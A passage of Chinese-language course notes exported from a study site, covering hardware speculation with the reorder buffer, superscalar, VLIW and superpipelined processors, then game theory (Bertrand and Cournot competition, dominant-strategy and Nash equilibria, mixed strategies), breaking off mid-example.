<h2 id="note-arch-chap4-hardware-based-speculation">Hardware-Based Speculation<a class="headerlink" href="#note-arch-chap4-hardware-based-speculation" title="Permanent link">&para;</a></h2>
<p>乱序执行，顺序提交.</p>
<p>硬件推测执行是一种高级处理器优化技术，它允许处理器在不确定指令是否应该执行的情况下提前执行指令。这种技术主要用于分支预测和异常处理。</p>
<p>ROB是实现乱序执行、顺序提交的核心组件，它为未提交的指令结果提供缓存：</p>
<ol>
<li>
<p><strong>结构</strong>：ROB包含三个主要字段</p>
<ul>
<li>指令类型</li>
<li>目标地址</li>
<li>值</li>
</ul>
</li>
<li>
<p><strong>工作流程</strong>：</p>
<ul>
<li>当指令执行阶段完成时，将保留站(RS)中的值替换为ROB编号</li>
<li>增加指令提交阶段</li>
<li>ROB提供完成阶段和提交阶段的操作编号</li>
<li>一旦操作数提交，结果将写入寄存器</li>
</ul>
</li>
<li>
<p><strong>恢复机制</strong>：</p>
<ul>
<li>当分支预测失败时，可以轻松恢复推测执行的指令</li>
<li>当异常发生时，可以轻松恢复处理器状态</li>
</ul>
</li>
</ol>
<h4 id="note-arch-chap4-_2">推测执行的优势<a class="headerlink" href="#note-arch-chap4-_2" title="Permanent link">&para;</a></h4>
<ol>
<li><strong>性能提升</strong>：允许处理器在等待分支结果时继续执行后续指令</li>
<li><strong>资源利用</strong>：提高处理器资源的利用率</li>
<li><strong>隐藏延迟</strong>：可以隐藏内存访问和其他长延迟操作的延迟</li>
</ol>
<h4 id="note-arch-chap4-_3">推测执行的实现<a class="headerlink" href="#note-arch-chap4-_3" title="Permanent link">&para;</a></h4>
<ol>
<li><strong>分支预测</strong>：处理器预测分支的结果，并沿着预测路径执行指令</li>
<li><strong>检查点机制</strong>：在推测执行前保存处理器状态</li>
<li><strong>提交控制</strong>：只有当确认推测是正确的时，才会提交指令结果</li>
<li><strong>回滚机制</strong>：当推测错误时，丢弃推测执行的结果并恢复到检查点状态</li>
</ol>
<p>推测执行与乱序执行结合使用时，可以显著提高处理器的性能，特别是在处理具有复杂控制流的程序时。</p>
<p>如果使用tomasulo算法，那么需要新增一个ROB，用于存储指令的执行结果，然后当指令执行完成后，将结果写入ROB，然后当指令提交时，将结果写入寄存器.同时指令执行需要多一个Commit阶段</p>
<ul>
<li>Issue</li>
<li>Execute</li>
<li>Write Back</li>
<li>Commit</li>
</ul>
<div class="admonition property">
<p class="admonition-title">Property</p>
<p>硬件推测执行结合了以下三个关键思想：</p>
<ol>
<li>
<p><strong>动态分支预测</strong>：</p>
<ul>
<li>用于选择要执行哪些指令</li>
<li>基于历史执行模式预测分支方向</li>
<li>允许处理器在分支结果确定前继续执行</li>
</ul>
</li>
<li>
<p><strong>推测执行</strong>：</p>
<ul>
<li>允许在控制依赖解决前执行指令</li>
<li>具备撤销错误推测序列效果的能力</li>
<li>使用ROB等机制保存中间状态以便回滚</li>
</ul>
</li>
<li>
<p><strong>动态调度</strong>：</p>
<ul>
<li>处理不同基本块组合的调度</li>
<li>允许指令根据数据依赖关系和资源可用性动态重排序</li>
<li>最大化指令级并行性</li>
</ul>
</li>
</ol>
</div>
<p>对于register status，需要新增一个ROB，用于存储指令的执行结果，还有一个是否Busy的字段；</p>
<h2 id="note-arch-chap4-multiple-issue">Multiple Issue<a class="headerlink" href="#note-arch-chap4-multiple-issue" title="Permanent link">&para;</a></h2>
<h3 id="note-arch-chap4-superscalar">Superscalar、<a class="headerlink" href="#note-arch-chap4-superscalar" title="Permanent link">&para;</a></h3>
<p>超标量处理器（Superscalar）是一种能够在单个时钟周期内发射和执行多条指令的处理器架构。</p>
<ul>
<li>每个时钟周期发射的指令数量不是固定的</li>
<li>实际发射数量取决于代码的具体情况</li>
<li>通常有一个上限（1-8条指令）</li>
<li>如果上限为n，则称为n发射超标量处理器</li>
</ul>
<div class="admonition warning">
<p class="admonition-title">Warning</p>
<p>注意只是上限，并不是说一定发射这么多</p>
</div>
<ul>
<li>可以通过编译器静态调度</li>
<li>也可以基于Tomasulo算法进行动态调度</li>
</ul>
<p>超标量处理器相比于标量处理器能够显著提高处理器的吞吐量，但也增加了硬件复杂度和功耗。</p>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-17.png" width="500" />

<figcaption>超标量处理器</figcaption>
</figure>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-18.png" width="500" />

<figcaption>超标量处理器</figcaption>
</figure>
<h3 id="note-arch-chap4-vliw">VLIW<a class="headerlink" href="#note-arch-chap4-vliw" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Very Long Instruction Word</p>
</blockquote>
<p>VLIW（超长指令字）是一种计算机架构设计，具有以下特点：</p>
<ul>
<li>每个时钟周期发射的指令数量是固定的（通常为4-16条），这些指令组成一个长指令或指令包（instruction packet）。</li>
<li>在指令包中，指令之间的并行性通过指令本身显式表达。</li>
<li>指令调度由编译器静态完成，而非硬件动态调度。</li>
<li>已成功应用于数字信号处理和多媒体应用领域。</li>
</ul>
<p>VLIW架构将复杂性从硬件转移到编译器，编译器负责识别和调度并行指令，从而简化了处理器设计，并减少了硬件复杂度。</p>
<p><strong>VLIW的主要特征：</strong></p>
<ul>
<li><strong>指令包中的并行性是显式的</strong>：多条指令被打包成一个长指令字，每条指令独立执行在不同的功能单元上。</li>
<li><strong>固定的发射宽度</strong>：每个时钟周期发射固定数量的指令（4-16条），不像超标量处理器发射数量可变。</li>
<li><strong>编译时调度</strong>：编译器负责所有的指令调度和依赖分析，硬件不需要复杂的乱序执行逻辑。</li>
<li><strong>简化的硬件设计</strong>：减少了动态调度的硬件复杂性，使得处理器设计更简单、功耗更低。</li>
<li><strong>适用领域</strong>：特别适合于数字信号处理和多媒体应用，这些领域有大量可并行执行的计算。</li>
</ul>
<p><strong>与超标量架构的对比：</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>VLIW</th>
<th>超标量</th>
</tr>
</thead>
<tbody>
<tr>
<td>指令发射数量</td>
<td>固定（4-16）</td>
<td>可变（上限1-8）</td>
</tr>
<tr>
<td>并行性识别</td>
<td>编译时（静态）</td>
<td>运行时（动态）</td>
</tr>
<tr>
<td>指令调度</td>
<td>编译器完成</td>
<td>硬件完成</td>
</tr>
<tr>
<td>硬件复杂度</td>
<td>较低</td>
<td>较高</td>
</tr>
<tr>
<td>编译器复杂度</td>
<td>较高</td>
<td>较低</td>
</tr>
<tr>
<td>代码兼容性</td>
<td>较差（通常需要重编译）</td>
<td>较好</td>
</tr>
</tbody>
</table>
<p><strong>VLIW的优缺点：</strong></p>
<p>优点：
- 硬件设计简单，成本低
- 功耗较低
- 可预测的执行行为，有利于实时应用
- 潜在的高并行度</p>
<p>缺点：
- 代码密度较低（长指令字包含空操作）
- 二进制兼容性差（不同处理器间难以移植）
- 编译器要求高
- 对于控制密集型代码效率不高</p>
<h3 id="note-arch-chap4-super-pipeline">super pipeline<a class="headerlink" href="#note-arch-chap4-super-pipeline" title="Permanent link">&para;</a></h3>
<p>超流水线（Superpipelining）是一种计算机架构设计技术，具有以下特点：</p>
<ul>
<li>包含8个或更多指令流水线阶段的处理器被称为超流水线处理器</li>
<li>通过将传统流水线阶段分解为更多更简单的子阶段，使每个阶段的工作量更少，从而可以提高时钟频率</li>
<li>典型的超流水线处理器例子：SGI的MIPS系列R4000</li>
</ul>
<p><strong>R4000微处理器的主要特性：</strong></p>
<ul>
<li><strong>缓存系统</strong></li>
<li>芯片内集成了两种缓存：指令缓存和数据缓存</li>
<li>每个缓存容量为8 KB</li>
<li>
<p>每个缓存的数据宽度为64位</p>
</li>
<li>
<p><strong>核心处理组件（整数部分）</strong></p>
</li>
<li>一个32×32位通用寄存器组</li>
<li>算术逻辑单元（ALU）</li>
<li>专用乘法/除法单元</li>
</ul>
<p><strong>超流水线的优缺点：</strong></p>
<p>优点：
- 更高的时钟频率，潜在地提高了处理器性能
- 更细粒度的流水线阶段分解，使指令处理更加高效
- 更好的硬件资源利用率</p>
<p>缺点：
- 增加了流水线冒险的可能性
- 分支预测失败的惩罚更大（需要清空更多流水线阶段）
- 控制逻辑更加复杂
- 流水线寄存器增加，可能导致功耗和芯片面积增加</p>
<p>超流水线技术是提高指令级并行性的重要方法之一，通过平衡各阶段的延迟，使处理器能够以更高的频率运行，从而提高整体性能。</p>
<figure>
<img alt="image" src="../NOTE/Arch/img/chap4-19.png" width="500" />

<figcaption>超流水线</figcaption>
</figure></section></section>
                    <section class='print-page md-section' id='section-2-2-5' heading-number='2.2.5'>
                        <h1>数据要素市场<a class='headerlink' href='#section-2-2-5' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-datamarket" heading-number="2.2.5.1"><h1 id="note-datamarket-_1">数据要素市场<a class="headerlink" href="#note-datamarket-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 37 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<p>浙江大学课程综合实践2课程，由刘金飞老师授课。</p>
<p>课程网站：<a href="https://yhwu-is.github.io/Teach/ec/data_market/intro/">数据要素市场</a></p></section><section class="print-page" id="note-datamarket-gametheory" heading-number="2.2.5.2"><h1 id="note-datamarket-gametheory-lec-3-4">LEC 3-4<a class="headerlink" href="#note-datamarket-gametheory-lec-3-4" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 10009 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 20 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 35 分钟</p>
</div>
<h2 id="note-datamarket-gametheory-_1">社会福利<a class="headerlink" href="#note-datamarket-gametheory-_1" title="Permanent link">&para;</a></h2>
<figure>
    <img alt="Social Welfare" src="../NOTE/DataMarket/img/social.png" />
    <figcaption>社会福利</figcaption>
</figure>
<h2 id="note-datamarket-gametheory-_2">策略式博弈表达<a class="headerlink" href="#note-datamarket-gametheory-_2" title="Permanent link">&para;</a></h2>
<figure>
    <img alt="Strategy Game" src="../NOTE/DataMarket/img/strategy.png" />
    <figcaption>策略式博弈</figcaption>
</figure>
<div class="admonition info">
<p class="admonition-title">非合作博弈的分类</p>
<ul>
<li>
<p>是否完全信息：即参与人之间是否互相知道对方的效用函数，是否知道博弈的全局信息；</p>
</li>
<li>
<p>静态博弈或动态博弈，即参与人的行动是一次同时完成的，还是序贯进行的；在两个互相看不见的房子里进行石头剪刀布，不要求同时完成，但是行动的先后不会影响结果，因此是静态博弈；</p>
</li>
<li>
<p><strong>完全信息静态博弈 (Complete Information Static Game)</strong></p>
<ul>
<li><strong>定义</strong>: 所有参与者都了解彼此的支付函数（即知道每个人的目标），并同时做出决策。</li>
<li><strong>例子</strong>: 囚徒困境 (Prisoner's Dilemma)。</li>
</ul>
</li>
<li><strong>完全信息动态博弈 (Complete Information Dynamic Game)</strong><ul>
<li><strong>定义</strong>: 参与者的行动有先后顺序，后行动者可以观察到先行动者的行动。所有人都了解彼此的支付函数。</li>
<li><strong>例子</strong>: 价格领袖模型。</li>
</ul>
</li>
<li><strong>不完全信息静态博弈 (Incomplete Information Static Game)</strong><ul>
<li><strong>定义</strong>: 参与者同时做出决策，但至少有一个参与者不完全了解其他某个参与者的支付函数（即不确定对方的"类型"）。这类博弈也称为"贝叶斯博弈"。</li>
<li><strong>例子</strong>: 各种形式的拍卖 (Auctions)。</li>
</ul>
</li>
<li><strong>不完全信息动态博弈 (Incomplete Information Dynamic Game)</strong><ul>
<li><strong>定义</strong>: 参与者的行动有先后顺序，并且信息不完全。这类博弈通常涉及从行动中推断信息。</li>
<li><strong>例子</strong>: 拍卖。</li>
</ul>
</li>
</ul>
</div>
<h2 id="note-datamarket-gametheory-bertrand-competition">伯川德竞争 (Bertrand Competition)<a class="headerlink" href="#note-datamarket-gametheory-bertrand-competition" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">伯川德竞争</p>
<p>伯川德竞争是一种寡头市场模型，假设企业之间通过 <strong>价格</strong> 进行竞争。在这个模型中，企业生产同质产品，并且它们同时设定各自产品的价格。消费者将从价格最低的厂商购买。如果价格相同，消费者则平均分配到这些厂商。</p>
<p><figure markdown="span">
    <img alt="Bertrand Competition" src="../NOTE/DataMarket/img/Bertrand.png" />
    <figcaption>伯川德竞争</figcaption>
</figure></p>
</div>
<p><strong>核心假设：</strong></p>
<ul>
<li><strong>同质产品：</strong> 市场上的所有产品在消费者看来是完全相同的，没有品牌忠诚度或质量差异。</li>
<li><strong>价格竞争：</strong> 企业选择价格作为竞争变量，而非产量。</li>
<li><strong>同时定价：</strong> 各企业同时做出定价决策，且相互独立。</li>
<li><strong>无进入壁垒：</strong> (有时会假设)</li>
<li><strong>边际成本为常数：</strong> 通常假设各企业的边际成本相同且为常数。</li>
</ul>
<div class="admonition note">
<p class="admonition-title">伯川德均衡（纳什均衡）</p>
<ul>
<li><strong>均衡结果：</strong> 在伯川德竞争中，如果产品同质且边际成本相同，那么纳什均衡结果是所有企业的定价都等于其 <strong>边际成本 (P = MC)</strong>。</li>
<li><strong>"伯川德悖论"：</strong> 即使市场只有两家企业（双头垄断），只要它们进行价格竞争且产品同质，最终价格也会被压低到边际成本水平，就像完全竞争市场一样，企业获得零经济利润。这被称为"伯川德悖论"，因为它表明即使只有少数几家企业，市场竞争也可能非常激烈。</li>
<li>伯川德均衡不是占优均衡</li>
</ul>
</div>
<hr />
<h2 id="note-datamarket-gametheory-cournot-competition">古诺竞争 (Cournot Competition)<a class="headerlink" href="#note-datamarket-gametheory-cournot-competition" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">古诺竞争</p>
<p>古诺竞争是另一种寡头市场模型，假设企业之间通过 <strong>产量</strong> 进行竞争。在这个模型中，企业同时决定各自的产量，然后市场价格由总产量和市场需求曲线决定。</p>
</div>
<p><strong>核心假设：</strong></p>
<ul>
<li><strong>同质产品：</strong> 市场上的所有产品是同质的。</li>
<li><strong>产量竞争：</strong> 企业选择产量作为竞争变量，而非价格。</li>
<li><strong>同时决策：</strong> 各企业同时决定产量，且相互独立。</li>
<li><strong>市场需求曲线：</strong> 市场价格是总产量的递减函数。</li>
<li><strong>边际成本为常数：</strong> 通常假设各企业的边际成本相同且为常数。</li>
</ul>
<div class="admonition note">
<p class="admonition-title">古诺均衡（纳什均衡）</p>
<ul>
<li><strong>均衡结果：</strong> 在古诺竞争的纳什均衡中，每个企业根据其他企业预期的产量来最大化自己的利润。最终均衡时的市场价格会介于垄断价格和边际成本之间，且高于边际成本。</li>
</ul>
</div>
<ul>
<li><strong>企业数量的影响：</strong><ul>
<li>当企业数量 <span class="arithmatex">\(J=1\)</span> 时（垄断），古诺均衡退化为垄断产量和价格。</li>
<li>当企业数量 <span class="arithmatex">\(J\)</span> 趋近于无穷大时，古诺均衡下的市场价格趋近于边际成本，总产量趋近于完全竞争下的总产量。这表明古诺模型是一个能够桥接垄断和完全竞争的统一框架。</li>
</ul>
</li>
</ul>
<hr />
<h2 id="note-datamarket-gametheory-dominant-strategy-equilibrium">占优策略均衡 (Dominant Strategy Equilibrium)<a class="headerlink" href="#note-datamarket-gametheory-dominant-strategy-equilibrium" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">占优策略均衡</p>
<p>占优策略均衡是纳什均衡的一种特殊且更强的形式。如果一个博弈中，每个参与者都有一个 <strong>占优策略</strong>，那么这些占优策略组成的策略组合就是占优策略均衡。</p>
</div>
<figure>
    <img alt="Dominant Strategy Equilibrium" src="../NOTE/DataMarket/img/Dominant.png" /> { width="50%" }
    <figcaption>占优策略</figcaption>
</figure>
<ul>
<li><strong>占优策略 (Dominant Strategy)：</strong> 一个策略如果无论其他参与者选择什么策略，它都能为该参与者带来最佳（或至少不差于任何其他策略）的收益，那么它就是该参与者的占优策略。<ul>
<li><strong>严格占优策略 (Strictly Dominant Strategy)：</strong> 如果无论其他参与者选择什么策略，它都能为该参与者带来 <strong>严格更高</strong> 的收益，那么它是严格占优策略。</li>
<li><strong>弱占优策略 (Weakly Dominant Strategy)：</strong> 如果无论其他参与者选择什么策略，它都能为该参与者带来 <strong>至少同样高</strong> 的收益，并且在某些情况下能带来严格更高的收益，那么它是弱占优策略。</li>
</ul>
</li>
</ul>
<p><strong>特点：</strong></p>
<ol>
<li><strong>易于预测：</strong> 如果存在占优策略均衡，那么博弈的最终结果很容易被预测，因为每个理性参与者都应该选择其占优策略。</li>
<li><strong>与纳什均衡的关系：</strong><ul>
<li>如果一个博弈存在占优策略均衡，那么它一定是纳什均衡。</li>
<li>如果一个博弈存在**严格占优策略均衡**，那么这个均衡是**唯一**的纳什均衡。</li>
<li>然而，纳什均衡不一定要求存在占优策略，许多博弈有纳什均衡但没有占优策略均衡（例如剪刀石头布）。</li>
</ul>
</li>
</ol>
<div class="admonition info">
<p class="admonition-title">颤抖的手原则</p>
<p>在博弈论中，颤抖的手原则（Shaky Hand Principle）是指在某些情况下，参与者在博弈中可能会犯错误；
<figure markdown="span">
    <img alt="Shaky Hand Principle" src="../NOTE/DataMarket/img/ex1.png" />
    <figcaption>颤抖的手原则</figcaption>
</figure></p>
<p><span class="arithmatex">\(B\)</span> 弱占优 <span class="arithmatex">\(T\)</span></p>
<p>考虑列参与人分别以 <span class="arithmatex">\(x\)</span> 和 <span class="arithmatex">\(1-x\)</span> 的概率选择 <span class="arithmatex">\(L\)</span> 和 <span class="arithmatex">\(R\)</span>（<span class="arithmatex">\(0&lt;x&lt;1\)</span>），那么行参与人会选择 <span class="arithmatex">\(B\)</span>，因为 <span class="arithmatex">\(T\)</span> 的期望效用是 <span class="arithmatex">\(x + 2(1-x) = 2-x\)</span>，而 <span class="arithmatex">\(B\)</span> 的期望效用是 <span class="arithmatex">\(2\)</span>。</p>
</div>
<p>可以在表格中反复剔除劣策略找到博弈的解。</p>
<div class="admonition example">
<p class="admonition-title">囚徒困境</p>
<p><figure markdown="span">
    <img alt="Prisoner's Dilemma" src="../NOTE/DataMarket/img/Prisoner.png" />
    <figcaption>囚徒困境</figcaption>
</figure>
这是一个经典的占优策略均衡的例子。无论对方坦白还是抵赖，对个人而言，坦白都是严格占优策略。因此，双方都坦白是严格占优策略均衡，也是唯一的纳什均衡。</p>
</div>
<div class="admonition example">
<p class="admonition-title">剪刀石头布</p>
<p>剪刀石头布（Rock-Paper-Scissors）这个游戏**有纳什均衡**，但它是一个**混合策略纳什均衡（Mixed Strategy Nash Equilibrium）**。</p>
<p>在剪刀石头布中，<strong>没有纯策略纳什均衡</strong>。这意味着你无法找到一个单一的、确定的策略（比如"我只出剪刀"），使得在已知对方策略的情况下，你没有动机改变。</p>
<p>让我们来分析一下：</p>
<ul>
<li>如果你总是出剪刀，那么你的对手就会知道这一点，并且总是出石头来赢你。</li>
<li>如果你总是出石头，你的对手就会出布来赢你。</li>
<li>如果你总是出布，你的对手就会出剪刀来赢你。</li>
</ul>
<p>所以，任何纯策略都不是纳什均衡，因为总是存在一个对手可以通过选择另一个策略来打败你的策略。</p>
<p><strong>混合策略纳什均衡</strong></p>
<p>在剪刀石头布中，唯一的纳什均衡是每个玩家都以 <strong>&#8531; 的概率</strong> 随机选择剪刀、石头和布。</p>
<p><strong>为什么这是纳什均衡？</strong></p>
<p>如果你的对手以 &#8531; 的概率随机出剪刀、石头和布：
* 你出剪刀的期望收益是：(&#8531;) * (平局) + (&#8531;) * (输) + (&#8531;) * (赢) = 0 (假设赢+1，输-1，平0)
* 你出石头的期望收益是：(&#8531;) * (赢) + (&#8531;) * (平局) + (&#8531;) * (输) = 0
* 你出布的期望收益是：(&#8531;) * (输) + (&#8531;) * (赢) + (&#8531;) * (平局) = 0</p>
<p>无论你选择哪个纯策略，你的期望收益都是0。因此，你没有动机偏离随机选择的策略，因为你无法通过单方面改变策略来获得更高的期望收益。同理，对手也没有动机偏离。</p>
</div>
<div class="admonition example">
<p class="admonition-title">公地悲剧</p>
<p>有一块公共牧场（这就是"公地"）。村里的每个农民都可以自由地在这块牧场上放牧自己的奶牛。假设放牧的奶牛越多，牧场的草地资源就越紧张，每头奶牛能吃到的草就越少，因此每头奶牛产奶量（收益）就会下降。</p>
<p>农民的个体理性决策：</p>
<p>每个农民在决定是否多养一头奶牛时，都会进行如下思考：</p>
<p>收益： 如果我多养一头奶牛，这头奶牛带来的产奶收益几乎全部归我所有。</p>
<p>成本： 这头奶牛会额外消耗牧场的草，导致所有奶牛（包括我自己的和其他农民的）的产奶量略有下降。但这个下降的成本是分散到所有奶牛身上的，对我自己的那头新奶牛而言，它分摊的成本只是一小部分。而养这头牛的直接成本（比如买牛的钱）是我自己承担的。</p>
<p>由于每增加一头奶牛所带来的收益（几乎全部归己）大于其边际成本（特别是对公共草地造成的外部性被分散了），所以每个农民都有激励去尽可能多地增加自己的奶牛数量，直到他认为增加一头奶牛的私人收益不再大于私人成本。</p>
<p>集体的非理性结果（悲剧）：</p>
<p>当所有农民都进行这种个体理性决策时，结果是：</p>
<p>奶牛数量过多： 牧场上的奶牛总数远远超过了牧场的承载能力。</p>
<p>草地退化： 牧场被过度放牧，草地资源枯竭，变得贫瘠。</p>
<p>所有农民的损失： 最终，每头奶牛的产奶量都大幅下降，甚至无法维持生存。整个牧场遭到破坏，所有农民的收益都受到严重损害，甚至可能完全消失。这个公共资源被"悲剧性"地耗尽了。</p>
</div>
<hr />
<h2 id="note-datamarket-gametheory-nash-equilibrium">纳什均衡 (Nash Equilibrium)<a class="headerlink" href="#note-datamarket-gametheory-nash-equilibrium" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">纳什均衡</p>
<p>纳什均衡是博弈论中最核心的均衡概念之一。一个策略组合如果满足以下条件，就是纳什均衡：在给定其他所有参与者策略的情况下，没有任何一个参与者可以通过单方面改变自己的策略来获得更高的收益。</p>
<p><figure markdown="span">
    <img alt="Nash Equilibrium" src="../NOTE/DataMarket/img/Nash.png" />
    <figcaption>纳什均衡</figcaption>
</figure></p>
<p>对于一个策略组合 <span class="arithmatex">\(s^* = (s_1^*, s_2^*, \dots, s_n^*)\)</span>，如果对于每个参与人 <span class="arithmatex">\(i\)</span> 和其所有可能的替代策略 <span class="arithmatex">\(s_i'\)</span>，都有 <span class="arithmatex">\(u_i(s_i^*, s_{-i}^*) \geqslant u_i(s_i', s_{-i}^*)\)</span>，那么 <span class="arithmatex">\(s^*\)</span> 就是一个纳什均衡。其中 <span class="arithmatex">\(u_i\)</span> 是参与人 <span class="arithmatex">\(i\)</span> 的支付函数，<span class="arithmatex">\(s_{-i}^*\)</span> 是除参与人 <span class="arithmatex">\(i\)</span> 之外所有其他参与人选择的策略。</p>
</div>
<ul>
<li><strong>存在性：</strong> 纳什均衡可能存在一个、多个或不存在（在纯策略纳什均衡中）。约翰·纳什证明了在有限参与者和有限策略的博弈中，至少存在一个混合策略纳什均衡。</li>
<li><strong>不一定是社会最优：</strong> 纳什均衡的结果可能是效率低下的。例如，在囚徒困境中，双方都坦白是纳什均衡，但它不是社会总福利最大化的结果（社会最优是双方都抵赖）。</li>
<li><strong>理性假设：</strong> 纳什均衡的推导基于所有参与者都是理性的，并且知道其他参与者也是理性的。</li>
</ul>
<div class="admonition note">
<p class="admonition-title">寻找纳什均衡的方法</p>
<p>如果有表格，则先固定看行，对于每一列，求出列参与者的最优策略，再看列，求出对于每一行列参与者的最优策略，则交叉点即为纳什均衡。</p>
</div>
<hr />
<h2 id="note-datamarket-gametheory-_3">混合策略纳什均衡<a class="headerlink" href="#note-datamarket-gametheory-_3" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">混合策略</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/DataMarket/img/mixed.png" />
</figure></p>
</div>
<div class="admonition definition">
<p class="admonition-title">混合扩展</p>
<p><figure markdown="span">
<img alt="" src="../NOTE/DataMarket/img/mixextend.png" />
</figure></p>
</div>
<p>例子</p>
<p><img alt="" src="../NOTE/DataMarket/img/ex2.png" /></p>
<div class="admonition definition">
<p class="admonition-title">混合策略纳什均衡</p>
<p>给定一个博弈的混合扩展 <span class="arithmatex">\(\Gamma=(N,(\Sigma_i)_{i\in N},(\mathcal{U}_i)_{i\in N})\)</span>，一个混合策略向量 <span class="arithmatex">\(\sigma^*=(\sigma^*_1,\ldots,\sigma^*_n)\)</span> 是一个混合策略纳什均衡，若对每个参与人 <span class="arithmatex">\(i\)</span>，有</p>
<div class="arithmatex">\[
    \mathcal{U}_i(\sigma^*) \geqslant \mathcal{U}_i(\sigma_i,\sigma^*_{-i}),\forall\sigma_i \in \Sigma
\]</div>
<p>等价条件</p>
<p>令 <span class="arithmatex">\(G=(N,(S_i)_{i\in N},(u_i)_{i\in N})\)</span> 为一个策略型博弈，<span class="arithmatex">\(\Gamma\)</span> 为 <span class="arithmatex">\(G\)</span> 的混合扩展。
一个混合策略向量 <span class="arithmatex">\(\sigma^*\)</span> 是 <span class="arithmatex">\(\Gamma\)</span> 的混合策略纳什均衡，当且仅当对于每个参
与人 <span class="arithmatex">\(i\)</span> 和每一个纯策略 <span class="arithmatex">\(s_i\in S_i\)</span>，有</p>
<div class="arithmatex">\[
\mathcal{U}_i(\sigma^*) \geqslant \mathcal{U}_i(s_i,\sigma^*_{-i})
\]</div>
<p>只需要满足不偏移纯策略</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>正向推导只需要注意到纯策略也是特殊的混合策略即可。反过来，对于参与人 <span class="arithmatex">\(i\)</span> 的每个混合策略 <span class="arithmatex">\(\sigma_i\)</span>，</p>
<div class="arithmatex">\[
    \mathcal{U}_i(\sigma_i,\sigma^*_{-i}) = \sum_{s_i\in S_i} \sigma_i(s_i)\mathcal{U}_i(s_i,\sigma^*_{-i}) \leqslant \sum_{s_i\in S_i} \sigma_i(s_i)\mathcal{U}_i(\sigma^*) = \mathcal{U}_i(\sigma^*)
\]</div>
</div>
</div>
<div class="admonition info">
<p class="admonition-title">无差异原则</p>
<p>令 <span class="arithmatex">\(\sigma^*\)</span> 为一个混合策略纳什均衡，<span class="arithmatex">\(s_i\)</span> 和 <span class="arithmatex">\(s_i'\)</span> 为参与人 <span class="arithmatex">\(i\)</span> 的两个纯策略，若 <span class="arithmatex">\(\sigma^*_i(s_i), \sigma^*_i(s_i') &gt; 0\)</span>，则 <span class="arithmatex">\(\mathcal{U}_i(s_i,\sigma^*_{-i}) = \mathcal{U}_i(s_i',\sigma^*_{-i})\)</span>。</p>
<p>定理成立的原因很简单：如果 <span class="arithmatex">\(\mathcal{U}_i(s_i,\sigma^*_{-i}) &gt; \mathcal{U}_i(s_i',\sigma^*_{-i})\)</span>那么参与人 <span class="arithmatex">\(i\)</span> 应增加 <span class="arithmatex">\(s_i\)</span> 的概率</p>
<div class="admonition question">
<p class="admonition-title">Question</p>
<p>被赋予正概率的集合称为混合策略的支撑集合；</p>
<ul>
<li>
<p>问题：被严格占优的策略有可能属于混合策略的支撑集合吗；不能。</p>
</li>
<li>
<p>问题：为什么混合策略支撑集的策略无差异，不能只选择其中一个行动或任意选取概率分布；</p>
</li>
</ul>
<p>你之所以对自己的几个可选策略"无差异"，是由于你的对手采取了特定的策略组合。反过来，你也必须使用特定的概率组合，才能让你的对手也处于"无差异"状态，从而维持整个均衡的稳定。</p>
</div>
</div>
<div class="admonition example">
<p class="admonition-title">性别大战</p>
<p>考虑如下性别大战：一对夫妻要安排他们周末的活动，可选择的活动有看
足球赛（<span class="arithmatex">\(F\)</span>）和听音乐会（<span class="arithmatex">\(C\)</span>）。丈夫更喜欢看足球赛，而妻子更喜欢听音
乐会。如果他们选择的活动不同，那么他们都不会高兴，如果他们选择的
